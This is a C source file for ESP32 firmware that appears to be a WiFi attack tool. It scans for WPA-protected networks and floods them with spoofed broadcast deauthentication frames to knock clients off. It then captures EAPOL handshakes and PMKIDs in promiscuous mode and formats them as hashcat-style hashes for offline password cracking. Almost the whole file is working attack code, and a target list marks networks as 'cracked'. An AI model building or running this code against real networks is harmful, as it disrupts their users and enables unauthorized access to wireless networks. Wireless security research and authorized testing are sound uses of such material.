#include "wifi.h"
#include "esp_interface.h"
#include "esp_wifi.h"
#include "esp_wifi_types_generic.h"
#include "freertos/idf_additions.h"
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sdkconfig.h"
#include "wifi_checks_bypass.h"
#include "led.h"
#include "targeting.h"

uint8_t esp_mac[6];

char current_ssid[33];
uint8_t current_bssid[6];

bool live_attack = false;

void wifi_init() {

	nvs_flash_init();

    esp_netif_init(); //initialize TCP/IP stack
    esp_event_loop_create_default();


	esp_netif_t* station_netif = esp_netif_create_default_wifi_sta();
    assert(station_netif);
	esp_netif_t* ap_netif = esp_netif_create_default_wifi_ap();
    assert(ap_netif);
    
    wifi_init_config_t wifi_conf = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&wifi_conf);

	wifi_config_t wifi_ap_conf = {
		.ap = {
			.ssid = CONFIG_SSID,
			.ssid_len = strlen(CONFIG_SSID),
			.password = CONFIG_PASSWORD,
			.authmode = WIFI_AUTH_WPA2_PSK,
			.max_connection = 1
		}
	};

	esp_wifi_set_config(WIFI_IF_AP, &wifi_ap_conf);

	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_max_tx_power(82);
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_start();

	esp_wifi_get_mac(ESP_IF_WIFI_AP, esp_mac);
}

void wifi_scan() {
	#if CONFIG_LED
	led_set_color(0x00, 0x00, 0xff);
	#endif

    wifi_ap_record_t ap_info[CONFIG_MAX_SCAN_LIST_LENGTH];
    uint16_t ap_count = 0;

	esp_wifi_scan_start(NULL, true); //bool to change if this call is blocking
 	esp_wifi_scan_get_ap_num(&ap_count);
    esp_wifi_scan_get_ap_records(&ap_count, ap_info);

	for(int i = 0; i < ap_count; i++) {
		if(ap_info[i].authmode != WIFI_AUTH_WPA_PSK && ap_info[i].authmode != WIFI_AUTH_WPA2_PSK && ap_info[i].authmode != WIFI_AUTH_WPA_WPA2_PSK && ap_info[i].authmode != WIFI_AUTH_WPA3_PSK && ap_info[i].authmode != WIFI_AUTH_WPA2_WPA3_PSK) continue;

		attack_target_t target;
		memcpy(target.ssid, ap_info[i].ssid, 33);
		memcpy(target.bssid, ap_info[i].bssid, 6);
		target.cracked = false;
		target.primary_channel = ap_info[i].primary;
		add_target(&target);
	}
}

void wifi_promisc_on_channel(uint8_t channel, wifi_promiscuous_cb_t callback_func) {
		esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
		esp_wifi_set_promiscuous(true);
		esp_wifi_set_promiscuous_rx_cb(callback_func);
}



eapol_info is_eapol_frame(uint8_t* frame) {
	if((frame[32] == 0x88 && frame[33] == 0x8e)) return EAPOL_START_32;
	else if(frame[30] == 0x88 && frame[31] == 0x8e) return EAPOL_START_30;
	else return EAPOL_NONE;
}



uint8_t eapol_message_number(uint8_t* eapol_packet) {
	uint8_t key_info_flags[2] = {eapol_packet[7], eapol_packet[8]};
	bool key_ack_set = ((key_info_flags[1]) & (1<<7)) != 0;
	bool key_mic_set = ((key_info_flags[0]) & 1) != 0;

	bool nonce_present = false;
	for(int i = 0; i < 32; i++) {
		if(eapol_packet[19+i] != 0) { 
			nonce_present = true;
			break;
		}
	}

	if(key_ack_set) {
		return key_mic_set ? 3 : 1;
	} else {
		return nonce_present ? 2 : 4;
	}
}

bool has_pmkid(uint8_t* eapol_packet) {
	if((uint16_t)*(eapol_packet+100) > 0) { // key data length > 0
		if((uint8_t)*(eapol_packet+106) == 0x04) return true; // data type = 4
	}
	return false;
}

void extract_pmkid(uint8_t* frame) {
	char pmkid[33];
	char bssid[13];
	char sta_mac[13];
	char ssid[65];

	uint8_to_hex_string(frame+139, 16, pmkid, 33);
	uint8_to_hex_string(frame+10, 6, bssid, 13);
	uint8_to_hex_string(frame+4, 6, sta_mac, 13);
	uint8_to_hex_string((uint8_t*)current_ssid, strlen(current_ssid), ssid, 65);
		
	char* hash = malloc(150);
	snprintf(hash, 150, "WPA*01*%s*%s*%s*%s***01\n",pmkid,bssid,sta_mac,ssid);
	printf("%s\n", hash);

	#if CONFIG_LED
	led_set_color(0x00, 0xff, 0x00);
	#endif

	live_attack = false; 

	set_current_target_cracked(hash);
}

eapol_frame_t* disect_eapol_frame(uint8_t* frame, uint8_t message_number, int eapol_start_position, eapol_frame_t* eapol_frame) {
	eapol_frame->message_number = message_number;

	memcpy(eapol_frame->mac_to, frame+4, 6);
	memcpy(eapol_frame->mac_from, frame+10, 6);

	free(eapol_frame->full_eapol_packet);
	eapol_frame->full_eapol_length = ((uint16_t)*(frame+eapol_start_position+5)) + 4;
	eapol_frame->full_eapol_packet = malloc(eapol_frame->full_eapol_length);
	memcpy(eapol_frame->full_eapol_packet, frame+eapol_start_position+2, eapol_frame->full_eapol_length);

	eapol_frame->nonce = eapol_frame->full_eapol_packet+17;
	eapol_frame->mic = eapol_frame->full_eapol_packet+81;


	return eapol_frame;
}

void extract_eapol_hash(eapol_frame_t* message_1, eapol_frame_t* message_2, eapol_message_pair message_pair) {

	char mac_ap[13];
	char mac_client[13];
	char essid[65];
	char mic[33];
	char nonce[65];

	uint8_to_hex_string((uint8_t*)current_ssid, strlen(current_ssid), essid, 64);
	switch (message_pair) {
			case M2_M3: {
            uint8_to_hex_string(message_2->mac_to, 6, mac_client, 13);
			uint8_to_hex_string(message_2->mac_from, 6, mac_ap, 13);
			uint8_to_hex_string(message_1->mic, 16, mic, 33);
			uint8_to_hex_string(message_2->nonce, 32, nonce, 65);
			
			memset(message_1->mic, 0, 16); // clear MIC for eapol_client field
			char eapol_client[message_1->full_eapol_length * 2 + 1];
			uint8_to_hex_string(message_1->full_eapol_packet, message_1->full_eapol_length, eapol_client, message_1->full_eapol_length*2 + 1);

			char* message_pair_byte = "a2";

			int hash_size = 212 + message_1->full_eapol_length * 2;
			char* hash = malloc(hash_size);

			snprintf(hash, hash_size, "WPA*02*%s*%s*%s*%s*%s*%s*%s", mic, mac_ap, mac_client, essid, nonce, eapol_client, message_pair_byte);

			printf("%s\n",hash);

			#if CONFIG_LED
			led_set_color(0x00, 0xff, 0x00);
			#endif

			live_attack = false; 

			set_current_target_cracked(hash);

			break;
		}

		default:
			printf("TS is not implemented\n");
			break;	
	}
}

// I'm 90% sure that this can turn in to a race condition, but works for now
eapol_frame_t M1;
eapol_frame_t M2;
eapol_frame_t M3;
eapol_frame_t M4;

void eapol_packet_handler(void* buf, wifi_promiscuous_pkt_type_t type) {
	if(!live_attack) return;
	wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t*) buf;

	eapol_info eapol_inf = is_eapol_frame(frame->payload);
	if(eapol_inf == EAPOL_NONE) return; 

	if(memcmp(frame->payload+4, esp_mac, 6) == 0 || memcmp(frame->payload+10, esp_mac, 6) == 0) return; // do not capture esps own frames
	

	int eapol_start_position = eapol_inf == EAPOL_START_30 ? 30 : 32;
	uint8_t message_number = eapol_message_number(frame->payload+eapol_start_position);

	printf("Eapol starts at: %d and detected message number: %d\n", eapol_start_position, message_number);

	switch (message_number) {
		case 1:
			if(has_pmkid(frame->payload+eapol_start_position))
			{
				extract_pmkid(frame->payload);
			} else {
				disect_eapol_frame(frame->payload, message_number, eapol_start_position, &M1);
				free(M2.full_eapol_packet);
				M2.full_eapol_packet = NULL;
				free(M3.full_eapol_packet);
				M3.full_eapol_packet = NULL;
				free(M4.full_eapol_packet);
				M4.full_eapol_packet = NULL;
			}
		break;

		case 2:
			disect_eapol_frame(frame->payload, message_number, eapol_start_position, &M2);

			if(M1.full_eapol_packet != NULL) {
				extract_eapol_hash(&M1, &M2, M1_M2);
			}
			free(M3.full_eapol_packet);
			M3.full_eapol_packet = NULL;
			free(M4.full_eapol_packet);
			M4.full_eapol_packet = NULL;
			break;

		case 3:
			disect_eapol_frame(frame->payload, message_number, eapol_start_position, &M3);

		    if(M2.full_eapol_packet != NULL) {
				extract_eapol_hash(&M2, &M3, M2_M3);
			}

			free(M1.full_eapol_packet);
			M1.full_eapol_packet = NULL;
			free(M4.full_eapol_packet);
			M4.full_eapol_packet = NULL;
		    break;
		

		default:
			printf("Not implemented message number: %d\n", message_number);
			break;
	}
}

void sniff_eapol(uint8_t channel, char ssid[], uint8_t bssid[6]) {
	live_attack = true;
	strcpy(current_ssid, ssid);
	memcpy(current_bssid, bssid, 6);

	esp_wifi_deauth_sta(0);
    vTaskDelay(100 / portTICK_PERIOD_MS);

	esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

	wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA};
	esp_wifi_set_promiscuous_filter(&filter);
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_rx_cb(&eapol_packet_handler);
}

typedef struct {
	uint8_t	frame_ctrl[2];
	uint8_t duration[2];
	uint8_t r_addr[6]; // receiver address
	uint8_t t_addr[6]; // transmitter address
	uint8_t addr_3[6];
	uint8_t seq_ctrl[2];
	uint8_t reason_code[2];
} __attribute__((packed)) wifi_80211_deauth_frame_t;

void deauth_ap(uint8_t bssid[6], int iterations) {
	wifi_80211_deauth_frame_t deauth_frame = {
		.frame_ctrl = {0xc0, 0x0},
		.duration = {0x3a, 0x01},
		.r_addr = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		.seq_ctrl = {0x00, 0x00},
		.reason_code = {0xf0, 0xff}
	};

	memcpy(deauth_frame.t_addr, bssid, 6);
	memcpy(deauth_frame.addr_3, bssid, 6);

	for (int i = 0; i < iterations; i++) {
		raw_80211_tx(WIFI_IF_AP, (uint8_t*)&deauth_frame, sizeof(wifi_80211_deauth_frame_t), false);
    	vTaskDelay(500 / portTICK_PERIOD_MS);
		if(!live_attack) return;
	}

    vTaskDelay(5000 / portTICK_PERIOD_MS);
}

void wifi_promisc_off()
{
	esp_wifi_set_promiscuous(false);
	free(M1.full_eapol_packet);
	M1.full_eapol_packet = NULL;
	free(M2.full_eapol_packet);
	M2.full_eapol_packet = NULL;
	free(M3.full_eapol_packet);
	M3.full_eapol_packet = NULL;
	free(M4.full_eapol_packet);
	M4.full_eapol_packet = NULL;

}
